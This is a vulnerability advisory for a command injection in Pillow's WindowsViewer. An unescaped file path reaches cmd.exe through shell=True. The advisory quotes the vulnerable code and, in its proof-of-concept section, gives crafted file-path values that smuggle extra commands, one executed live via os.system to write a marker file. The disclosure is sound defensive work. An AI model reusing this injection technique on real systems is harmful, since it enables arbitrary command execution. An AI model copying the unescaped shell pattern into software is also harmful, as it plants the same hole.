# [M] Pillow: WindowsViewer.get_command() OS command injection via unescaped shell path

## Summary
Severity: Medium
Advisory: GHSA-4x4j-2g7c-83w6
CVE: CVE-2026-55798
CWE: CWE-78
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:L/AC:H/PR:N/UI:R/S:U/C:L/I:L/A:L (CVSS_V3)
Published: 2026-07-20
Source: https://github.com/advisories/GHSA-4x4j-2g7c-83w6
Type: github-advisory

## Affected
- PyPI: `Pillow` — affected >=0 <12.3.0

## Details
### 1. Summary

`WindowsViewer.get_command()` constructs a `cmd.exe` shell command by directly embedding a
file path into an f-string without escaping. The result is passed to
`subprocess.Popen(..., shell=True)`. Shell metacharacters in the file path — most
importantly a double-quote (`"`) that breaks out of the wrapping, followed by `&` — allow
injection of arbitrary `cmd.exe` commands.

The macOS equivalent (`MacViewer`) correctly applies `shlex.quote()` to the same parameter.
The Linux equivalent (`UnixViewer`) does likewise. Windows is the only platform missing this
protection, despite `shlex.quote` being **already imported** on line 21 of `ImageShow.py`.

---

### 2. Vulnerable Code

**File:** `src/PIL/ImageShow.py`, lines 133–150

```python
class WindowsViewer(Viewer):
    format = "PNG"
    options = {"compress_level": 1, "save_all": True}

    def get_command(self, file: str, **options: Any) -> str:
        return (
            f'start "Pillow" /WAIT "{file}" '    # ← f-string, no escaping
            "&& ping -n 4 127.0.0.1 >NUL "
            f'&& del /f "{file}"'                # ← same path, unescaped again
        )

    def show_file(self, path: str, **options: Any) -> int:
        if not os.path.exists(path):
            raise FileNotFoundError
        subprocess.Popen(
            self.get_command(path, **options),
            shell=True,                          # ← shell=True
            creationflags=getattr(subprocess, "CREATE_NO_WINDOW"),
        )  # nosec                               # ← Bandit warning suppressed manually
        return 1
```

**Contrast with macOS — SAFE (line 164–168):**
```python
class MacViewer(Viewer):
    def get_command(self, file: str, **options: Any) -> str:
        command = "open -a Preview.app"
        command = f"({command} {quote(file)}; sleep 20; rm -f {quote(file)})&"
        return command                           # ← shlex.quote() applied
```

**Cross-platform summary:**

| Platform | Class          | `shlex.quote()`? | `shell=True`? | Safe? |
|----------|----------------|------------------|---------------|-------|
| macOS    | `MacViewer`    | **Yes** (line 168) | No (list args) | ✅ Yes |
| Linux    | `UnixViewer`   | **Yes** (line 207) | No (list args) | ✅ Yes |
| Windows  | `WindowsViewer`| **No** (line 134–137) | **Yes** (line 148) | ❌ No |

`shlex.quote` is imported on line 21. Its omission from the Windows path is a clear
oversight, not a deliberate design choice.

---
### 3. Proof of Concept

A full working PoC is at `poc_pillow_injection.py`. Key parts:

**Part A — Injection string construction (static, no execution):**
```python
from PIL.ImageShow import WindowsViewer

viewer = WindowsViewer()
evil_path = r'C:\Temp\evil" & echo PWNED & echo "'
cmd = viewer.get_command(evil_path)
print(cmd)
# Output:
# start "Pillow" /WAIT "C:\Temp\evil" & echo PWNED & echo "" && ping ...
# ┌─ start "Pillow" /WAIT "C:\Temp\evil"   → fails (file not found)
# ├─ & echo PWNED                           → INJECTED COMMAND
# └─ & echo ""  && ping ...                → continues
```

**Part B — Live execution via `os.system()` (verified on Windows 11, Pillow 12.1.1):**
```python
import os, tempfile
from PIL.ImageShow import WindowsViewer

viewer = WindowsViewer()
poc_dir = tempfile.mkdtemp()
marker  = os.path.join(poc_dir, "INJECTION_CONFIRMED.txt")

# Craft injection: payload writes a marker file (harmless)
payload   = f'echo REAL_INJECTED > "{marker}"'
evil_path = os.path.join(poc_dir, f'poc" & {payload} & echo "')

# Call the REAL Pillow get_command():
real_cmd = viewer.get_command(evil_path)

# Execute the same way the base Viewer.show_file() does (os.system):
os.system(real_cmd)

assert os.path.exists(marker)                          # PASSES — marker was created
assert "REAL_INJECTED" in open(marker).read()          # PASSES
# → CONFIRMED: arbitrary command injection via get_command()
```

---

## References
- https://github.com/python-pillow/Pillow/security/advisories/GHSA-4x4j-2g7c-83w6
- https://nvd.nist.gov/vuln/detail/CVE-2026-55798
- https://github.com/python-pillow/Pillow/commit/8404ea5fe5df40fc34aa1e51403dd6fce0778b8a
- https://github.com/python-pillow/Pillow/commit/88194166691b7b603529b8b036ab3ab9cedd2de4
- https://github.com/python-pillow/Pillow/commit/b0e06caa64c1405aa3da0bb1d2bd9a77ca22de7f
- https://github.com/pypa/advisory-database/tree/main/vulns/pillow/PYSEC-2026-2257.yaml
- https://github.com/python-pillow/Pillow
- https://github.com/python-pillow/Pillow/blob/main/docs/releasenotes/12.3.0.rst
